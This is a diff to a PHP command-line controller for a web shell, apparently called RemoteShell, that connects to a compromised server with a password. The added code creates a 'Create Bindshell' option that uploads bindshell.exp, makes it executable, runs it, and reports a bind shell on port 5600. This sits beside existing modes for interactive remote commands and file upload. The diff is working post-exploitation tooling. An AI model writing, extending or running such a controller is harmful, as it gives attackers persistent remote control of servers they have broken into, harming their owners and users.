@@ -19,15 +19,15 @@ $input = fgets($inputs);
             print "[*] Kernel: ".$server_info->uname."\n";
             print "[*] Web Server: ".$server_info->software."\n";
             print "------------------------[  Type  ]------------------------\n";
-            print "[1] Commands Shell mode\n";
-            print "[2] Upload file\n";
+            print "[1] Commands Shell Mode\n";
+            print "[2] Upload File\n";
+            print "[3] Create Bindshell\n";
             print "Type: ";
             $inputs = fopen("php://stdin","r");
             $input = fgets($inputs);
             $type = trim($input);
             if($type == "1"){
                 $type = "shell";
-                $name = "commands";
                 while(1){
                     print "\33[1;31mRemoteShell@$os > \33[1;37m";
                     $inputs = fopen("php://stdin","r");
@@ -40,9 +40,9 @@ $input = fgets($inputs);
                     fclose($inputs);
                 }
             }
+            
             if($type == "2"){
                 $type = "upload";
-                $name = "upload";
                 while(1){
                     print "\33[1;31mRemoteShell@$os > File: \33[1;37m";
                     $inputs = fopen("php://stdin","r");
@@ -56,6 +56,16 @@ $input = fgets($inputs);
                     print "[!] File not found.\n";
                     }
                 }
+            }
+            
+            if($type == "3"){
+                print "\33[1;31mRemoteShell@$os > Creating bindshell... \33[1;37m\n";
+                $file = "bindshell.exp";
+                $filebody = file_get_contents($file, "r");
+                remoteshell_connect($url,$password,"","upload", $file, $filebody);
+                print "\33[1;31mRemoteShell@$os > Executing bindshell... \33[1;37m\n";
+                print remoteshell_connect($url,$password,"chmod 777 bindshell.exp && ./bindshell.exp","shell");
+                print "\33[1;31mRemoteShell@$os > Bindshell running on $server_info->ip_address:5600 \33[1;37m\n";
             }
             
     }else{
